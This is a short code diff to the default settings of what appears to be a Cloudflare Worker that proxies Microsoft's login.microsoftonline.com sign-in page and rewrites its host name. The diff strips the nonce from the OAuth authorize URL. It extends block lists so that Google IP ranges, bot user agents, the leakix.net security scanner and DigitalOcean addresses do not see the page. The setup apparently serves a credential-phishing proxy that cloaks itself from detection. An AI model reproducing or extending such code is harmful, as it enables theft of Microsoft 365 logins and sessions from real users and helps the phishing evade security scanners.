@@ -10,7 +10,7 @@
 // Fallback defaults - typically overridden by wrangler.toml [vars]
 const DEFAULTS = {
   upstreamHost: 'login.microsoftonline.com',
-  upstreamPath: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&nonce=93572',
+  upstreamPath: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All',
   clientTenant: 'common',
   forceHttps: 'true',
   replaceHostRegex: /login\.microsoftonline\.com/gi,
@@ -18,8 +18,8 @@ const DEFAULTS = {
   // Blocking lists - extend via wrangler.toml
   blockedIpPrefixes: ['0.0.0.0', '8.8.8.', '8.8.4.'],
   allowedIps: null,
-  blockedUaSubs: ['googlebot', 'bingbot', 'bot'],
-  blockedAsOrgs: ['google proxy', 'digital ocean'],
+  blockedUaSubs: ['googlebot', 'bingbot', 'bot', 'leakix.net'],
+  blockedAsOrgs: ['google proxy', 'digital ocean', 'digitalocean'],
   enableUaCheck: 'true',
   enableAsOrgCheck: 'true',
   enableMozillaCheck: 'true',
